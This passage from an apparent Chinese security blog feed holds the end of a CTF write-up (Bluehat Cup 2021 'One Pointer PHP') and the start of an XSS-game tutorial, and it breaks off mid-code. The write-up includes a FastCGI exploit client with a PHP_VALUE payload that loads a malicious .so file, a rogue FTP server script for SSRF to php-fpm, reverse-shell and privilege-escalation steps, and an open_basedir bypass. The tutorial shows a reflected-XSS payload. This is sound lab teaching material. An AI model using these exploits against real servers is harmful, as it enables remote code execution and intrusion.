variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$paramsRequest</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token variable">$paramsRequest</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$stdin</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'?file=ftp://ip:9999/&amp;data='</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        fwrite($this->_sock, $request);</span><span class="token comment">//        do &#123;</span><span class="token comment">//            $resp = $this->readPacket();</span><span class="token comment">//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) &#123;</span><span class="token comment">//                $response .= $resp['content'];</span><span class="token comment">//            &#125;</span><span class="token comment">//        &#125; while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);</span><span class="token comment">//        var_dump($resp);</span><span class="token comment">//        if (!is_array($resp)) &#123;</span><span class="token comment">//            throw new Exception('Bad request');</span><span class="token comment">//        &#125;</span><span class="token comment">//        switch (ord($resp['content']&#123;4&#125;)) &#123;</span><span class="token comment">//            case self::CANT_MPX_CONN:</span><span class="token comment">//                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');</span><span class="token comment">//                break;</span><span class="token comment">//            case self::OVERLOADED:</span><span class="token comment">//                throw new Exception('New request rejected; too busy [OVERLOADED]');</span><span class="token comment">//                break;</span><span class="token comment">//            case self::UNKNOWN_ROLE:</span><span class="token comment">//                throw new Exception('Role value not known [UNKNOWN_ROLE]');</span><span class="token comment">//                break;</span><span class="token comment">//            case self::REQUEST_COMPLETE:</span><span class="token comment">//                return $response;</span><span class="token comment">//        &#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// real exploit start here</span><span class="token comment">//if (!isset($_REQUEST['cmd'])) &#123;</span><span class="token comment">//    die("Check your input\n");</span><span class="token comment">//&#125;</span><span class="token comment">//if (!isset($_REQUEST['filepath'])) &#123;</span><span class="token comment">//    $filepath = __FILE__;</span><span class="token comment">//&#125;else&#123;</span><span class="token comment">//    $filepath = $_REQUEST['filepath'];</span><span class="token comment">//&#125;</span><span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/html/add_api.php"</span><span class="token punctuation">;</span><span class="token variable">$req</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token variable">$req</span> <span class="token operator">.</span><span class="token string single-quoted-string">'?'</span><span class="token operator">.</span><span class="token string single-quoted-string">'command=whoami'</span><span class="token punctuation">;</span><span class="token variable">$client</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FCGIClient</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"unix:///var/run/php-fpm.sock"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?php system(\$_REQUEST['command']); phpinfo(); ?>"</span><span class="token punctuation">;</span> <span class="token comment">// php payload -- Doesnt do anything</span><span class="token variable">$php_value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"unserialize_callback_func = system\nextension_dir = /var/www/html\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = "</span><span class="token punctuation">;</span> <span class="token comment">// extension_dir即为.so文件所在目录</span><span class="token variable">$params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string single-quoted-string">'GATEWAY_INTERFACE'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'FastCGI/1.0'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'REQUEST_METHOD'</span>    <span class="token operator">=></span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SCRIPT_FILENAME'</span>   <span class="token operator">=></span> <span class="token variable">$filepath</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SCRIPT_NAME'</span>       <span class="token operator">=></span> <span class="token variable">$req</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'QUERY_STRING'</span>      <span class="token operator">=></span> <span class="token string single-quoted-string">'command=whoami'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'REQUEST_URI'</span>       <span class="token operator">=></span> <span class="token variable">$uri</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'DOCUMENT_URI'</span>      <span class="token operator">=></span> <span class="token variable">$req</span><span class="token punctuation">,</span><span class="token comment">#'DOCUMENT_ROOT'     => '/',</span>    <span class="token string single-quoted-string">'PHP_VALUE'</span>         <span class="token operator">=></span> <span class="token variable">$php_value</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SERVER_SOFTWARE'</span>   <span class="token operator">=></span> <span class="token string single-quoted-string">'80sec/wofeiwo'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'REMOTE_ADDR'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'REMOTE_PORT'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'9001'</span><span class="token punctuation">,</span> <span class="token comment">// 找准服务端口</span>    <span class="token string single-quoted-string">'SERVER_ADDR'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SERVER_PORT'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'80'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SERVER_NAME'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SERVER_PROTOCOL'</span>   <span class="token operator">=></span> <span class="token string single-quoted-string">'HTTP/1.1'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'CONTENT_LENGTH'</span>    <span class="token operator">=></span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// print_r($_REQUEST);</span><span class="token comment">// print_r($params);</span><span class="token comment">//echo "Call: $uri\n\n";</span><span class="token keyword">echo</span> <span class="token variable">$client</span><span class="token operator">-></span><span class="token function">request</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>访问拿到payload</p><img src="/article/bluehat2021/image-20210503143546020.png" class="" title="fastpayload" loading="lazy"><h3 id="利用-ftp-与-php-fpm-对话-RCE"><a href="#利用-ftp-与-php-fpm-对话-RCE" class="headerlink" title="利用 ftp 与 php-fpm 对话 RCE"></a>利用 ftp 与 php-fpm 对话 RCE</h3><p>众所周知，如果可以将任意二进制数据包发送到 php-fpm 服务，则可以执行代码。 此技术通常与 <code>gopher://</code> 协议结合使用（ssrf），该协议受 curl 支持，<strong>但不受 php 支持</strong>。</p><p> <a href="https://www.php.net/manual/zh/wrappers.php#wrappers">php支持的协议和封装协议</a> 可代替发二进制包的协议只有<code>ftp://</code> ，况且 ftp 本身也是基于 tcp 的服务，能配合 php-fpm 进行 tcp 通信。</p><blockquote><p><strong>ftp 的两种传输模式</strong></p><p>ftp 有两种使用模式：主动模式（port）和被动模式（pasv）。</p><p>port 要求客户端和服务器端同时打开并且监听一个端口以创建连接。在这种情况下，客户端由于安装了防火墙会产生一些问题，连接有时候会被客户端的防火墙阻止。所以，创立了 pasv 。pasv 只要求服务器端产生一个监听相应端口的进程，这样就可以绕过客户端安装了防火墙的问题。</p><p>ftp 客户端和服务器之间需要建立两条 tcp 连接，一条是控制连接（ 21 端口），用来发送控制指令，另外一条是数据连接（ 20 端口 &#x2F; 随机端口），真正的文件传输是通过数据连接来完成的。</p><p><strong>两种传输模式的异同</strong></p><p>对于两种传输模式来说，控制连接的建立过程都是一样，均为服务器监听 21 号端口，客户端向服务器的该端口发起 tcp 连接。</p><p>两种传输模式的不同之处体现在数据连接的建立，对于数据连接的建立，主被动模式的不同在于数据连接的建立“服务器”是“主动”还是”被动”：</p><p>port 服务器通过控制连接知道客户端监听的端口后，使用自己的 20 号端口作为源端口，服务器“主动”发起 tcp 数据连接。</p><p>pasv 服务器监听 1024-65535 的一个随机端口，并通过控制连接将该端口告诉客户端，客户端向服务器的该端口发起 tcp 数据连接，这种情况下数据连接的建立相当于服务器是“被动”的。</p><img src="/article/bluehat2021/t012739ba782705dcdd.jpg" class="" title="ftp" loading="lazy"><p>如图，对于我们这题，显然只能用 pasv 模式，服务器监听的“随机端口”对应 php-fpm 监听的 9000 端口，详细过程我们通过一个实际的 pasv 例子来理解：</p><pre class="language-none"><code class="language-none">testbox1: &#123;&#x2F;home&#x2F;p-t&#x2F;slacker&#x2F;public_html&#125; % ftp -d testbox2Connected to testbox2.slacksite.com.220 testbox2.slacksite.com FTP server ready.Name (testbox2:slacker): slacker---&gt; USER slacker331 Password required for slacker.Password: TmpPass---&gt; PASS XXXX230 User slacker logged in.---&gt; SYST215 UNIX Type: L8Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; passivePassive mode on.ftp&gt; lsftp: setsockopt (ignored): Permission denied---&gt; PASV227 Entering Passive Mode (192,168,150,90,195,149).---&gt; LIST150 Opening ASCII mode data connection for file listdrwx------   3 slacker    users         104 Jul 27 01:45 public_html226 Transfer complete.ftp&gt; quit---&gt; QUIT221 Goodbye.</code></pre><p>以上是客户端 testbox1.slacksite.com (192.168.150.80) 发出 <code>PASV</code> 命令以指示其将等待服务器 testbox2.slacksite.com (192.168.150.90) “被动地”提供 ip 和端口号，然后客户端将创建到服务器的数据连接，其中：</p><pre class="language-none"><code class="language-none">227 Entering Passive Mode (192,168,150,90,195,149).</code></pre><p>这就是服务器“被动”返回的 ip 和端口号，分别是 32 位的主机地址和 16 位 tcp 端口地址，这个例子的就是 192.168.150.90 的 195*256 + 149 &#x3D; 50069 端口。</p><p>选择 ip 地址和端口号后，选择 ip 地址和端口的一方将开始侦听指定的地址&#x2F;端口，并等待另一方连接。 当对方连接到收听方后，数据传输开始。</p><p>我们这题需要将 ip 端口重定向为 127.0.0.1:9000 来试图 ssrf ，9000 % 256 &#x3D; 40 ，即可表达为：</p><pre class="language-none"><code class="language-none">227 Entering Passive Mode (127,0,0,1,35,40).</code></pre></blockquote><p><code>file_put_contents()</code> 用 <code>ftp://</code> 与我们的恶意服务器建立控制连接，使目标发送 <code>PASV</code> 命令，我们“被动”提供 ip 端口至本地 9001端口，然后建立起数据连接，将 data （fastcgi payload）的内容打到FastCGI服务</p><p>在<code>/var/www/html</code>目录写文件<code>file.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">'/tmp/file'</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">':)'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token operator">.</span><span class="token variable">$data</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// echo file_get_contents($file);</span></span></code></pre><p>准备利用前面生成的payload打</p><h3 id="起恶意ftp服务"><a href="#起恶意ftp服务" class="headerlink" title="起恶意ftp服务"></a>起恶意ftp服务</h3><p>用如下脚本，在公网vps起</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sockets <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'220 welcome\n'</span><span class="token punctuation">)</span><span class="token comment">#Service ready for new user.</span><span class="token comment">#Client send anonymous username</span><span class="token comment">#USER anonymous</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'331 Please specify the password.\n'</span><span class="token punctuation">)</span><span class="token comment">#User name okay, need password.</span><span class="token comment">#Client send anonymous password.</span><span class="token comment">#PASS anonymous</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'230 Login successful.\n'</span><span class="token punctuation">)</span><span class="token comment">#User logged in, proceed. Logged out if appropriate.</span><span class="token comment">#TYPE I</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'200 Switching to Binary mode.\n'</span><span class="token punctuation">)</span><span class="token comment">#Size /</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'550 Could not get the file size.\n'</span><span class="token punctuation">)</span><span class="token comment">#EPSV (1)</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 ok\n'</span><span class="token punctuation">)</span><span class="token comment">#PASV</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n'</span><span class="token punctuation">)</span> <span class="token comment">#STOR / (2) 注意打到9001端口的服务</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 Permission denied.\n'</span><span class="token punctuation">)</span><span class="token comment">#QUIT</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'221 Goodbye.\n'</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="干"><a href="#干" class="headerlink" title="干"></a>干</h3><p>干就完事了，访问<code>file.php</code>用payload打</p><p><code>./file.php?file=ftp://vps:9999/&amp;data=xxx</code></p><img src="/article/bluehat2021/image-20210503144504813.png" class="" title="gan" loading="lazy"><p>可以看到dump出来<code>int(681)</code>，这里就是打的数据包大小</p><p>这时已经突破open_basedir，可以任意访问目录了，同时也执行了恶意.so文件</p><img src="/article/bluehat2021/image-20210503144951807.png" class="" title="ls&#x2F;" loading="lazy"><p>下面就是suid提权了，那么大一个700 flag就在眼前</p><h3 id="拿shell"><a href="#拿shell" class="headerlink" title="拿shell"></a>拿shell</h3><p>既然可以执行恶意.so文件，那么直接弹个shell回来</p><img src="/article/bluehat2021/image-20210503145246770.png" class="" title="shell" loading="lazy"><p>在web shell上传自动化提权探测脚本，这里用的是<a href="https://github.com/rebootuser/LinEnum">LinEnum</a>，执行脚本，这里上传到哪都可以，毕竟已经突破了限制还弹了shell</p><pre class="language-none"><code class="language-none">&#x2F;var&#x2F;www&#x2F;html&#x2F;LinEnum.sh -s -r report -e &#x2F;tmp&#x2F; -t</code></pre><p>查看report</p><img src="/article/bluehat2021/image-20210503145518039.png" class="" title="report" loading="lazy"><p>没想到php就有s权限，直接运行即可</p><p>写文件</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>直接运行</p><img src="/article/bluehat2021/image-20210503145751850.png" class="" title="flag" loading="lazy"><p>GET IT</p><p>关于phpfpm与FastCGI模式的研究建议仔细看看部分参考文章，总的来说就是</p><p>FastCGI加载并调用hpdoger.so-&gt;bypass base_opendir-&gt;ftp-ssrf请求恶意ftp服务-&gt;本地php-fpm-&gt;rce</p><hr><p>参考文章：</p><p><a href="https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/">Ha1c9on</a></p><p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">PHP绕过open_basedir列目录的研究</a></p><p><a href="https://www.php.net/manual/zh/wrappers.glob.php">glob:&#x2F;&#x2F;</a></p><p><a href="https://xz.aliyun.com/t/5598">php-fpm的攻击方式</a></p><p><a href="https://www.cnblogs.com/leixiao-/p/10226633.html">PHP-FPM Fastcgi 未授权访问漏洞</a></p><p><a href="https://www.anquanke.com/post/id/186186#h3-3">Fastcgi绕过姿势</a></p><p><a href="https://www.anquanke.com/post/id/233454">利用ftp 与 php-fpm 对话 RCE</a></p><p><a href="https://buuoj.cn/challenges#[%E8%93%9D%E5%B8%BD%E6%9D%AF%202021]One%20Pointer%20PHP">复现平台buuoj</a></p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>xss学习</title>
      <link href="article/xss/"/>
      <url>article/xss/</url>
      
        <content type="html"><![CDATA[<p>谷歌的小游戏，复习一下xss</p><span id="more"></span><p>项目地址：<a href="https://xss-game.appspot.com/">https://xss-game.appspot.com/</a></p><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p><a href="https://xss-game.appspot.com/level1/frame">https://xss-game.appspot.com/level1/frame</a></p><pre class="language-python" data-language="python"><code class="language-python">page_header <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;!doctype html>&lt;html>  &lt;head>    &lt;!-- Internal game scripts/styles, mostly boring stuff -->    &lt;script src="/static/game-frame.js">&lt;/script>    &lt;link rel="stylesheet" href="/static/game-frame-styles.css" />  &lt;/head>   &lt;body id="level1">    &lt;img src="/static/logos/level1.png">      &lt;div>"""</span> page_footer <span class="token operator">=</span> <span class="token triple-quoted-string string">"""    &lt;/div>  &lt;/body>&lt;/html>"""</span> main_page_markup <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;form action="" method="GET">  &lt;input id="query" name="query" value="Enter query here..."    onfocus="this.value=''">  &lt;input id="button" type="submit" value="Search">&lt;/form>"""</span> <span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">def</span> <span class="token function">render_string</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>s<span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Disable the reflected XSS filter for demonstration purposes</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"X-XSS-Protection"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment"># Show main search page</span>      self<span class="token punctuation">.</span>render_string<span class="token punctuation">(</span>page_header <span class="token operator">+</span> main_page_markup <span class="token operator">+</span> page_footer<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      query <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">,</span> <span class="token string">'[empty]'</span><span class="token punctuation">)</span>             <span class="token comment"># Our search engine broke, we found no results :-(</span>      message <span class="token operator">=</span> <span class="token string">"Sorry, no results were found for &lt;b>"</span> <span class="token operator">+</span> query <span class="token operator">+</span> <span class="token string">"&lt;/b>."</span>      message <span class="token operator">+=</span> <span class="token string">" &lt;a href='?'>Try again&lt;/a>."</span>       <span class="token comment"># Display the results page</span>      self<span class="token punctuation">.</span>render_string<span class="token punctuation">(</span>page_header <span class="token operator">+</span> message <span class="token operator">+</span> page_footer<span class="token punctuation">)</span>         <span class="token keyword">return</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>关键部分</p><pre class="language-python" data-language="python"><code class="language-python">query <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">,</span> <span class="token string">'[empty]'</span><span class="token punctuation">)</span>             <span class="token comment"># Our search engine broke, we found no results :-(</span>      message <span class="token operator">=</span> <span class="token string">"Sorry, no results were found for &lt;b>"</span> <span class="token operator">+</span> query <span class="token operator">+</span> <span class="token string">"&lt;/b>."</span>      message <span class="token operator">+=</span> <span class="token string">" &lt;a href='?'>Try again&lt;/a>."</span></code></pre><p><code>Sorry, no results were found for &lt;b&gt; + query + &lt;/b&gt;.</code></p><p>GET请求query会直接填入网页html</p><img src="/article/xss/image-20210424143837616.png" class="" title="level1-1" loading="lazy"><p>直接打即可，payload:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><img src="/article/xss/image-20210424143953579.png" class="" title="level1-2" loading="lazy"><hr><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><a href="https://xss-game.appspot.com/level2/frame">https://xss-game.appspot.com/level2/frame</a></p><p>源码·index.html</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token comment">&lt;!-- This is our database of messages --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/post-store.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token keyword">var</span> defaultMessage <span class="token operator">=</span> <span class="token string">"Welcome!&lt;br>&lt;br>This is your &lt;i>personal&lt;/i>"</span>        <span class="token operator">+</span> <span class="token string">" stream. You can post anything you want here, especially "</span>        <span class="token operator">+</span> <span class="token string">"&lt;span style='color: #f00ba7'>madness&lt;/span>."</span><span class="token punctuation">;</span>       <span class="token keyword">var</span> <span class="token constant">DB</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PostDB</span><span class="token punctuation">(</span>defaultMessage<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">function</span> <span class="token function">displayPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> containerEl <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"post-container"</span><span class="token punctuation">)</span><span class="token 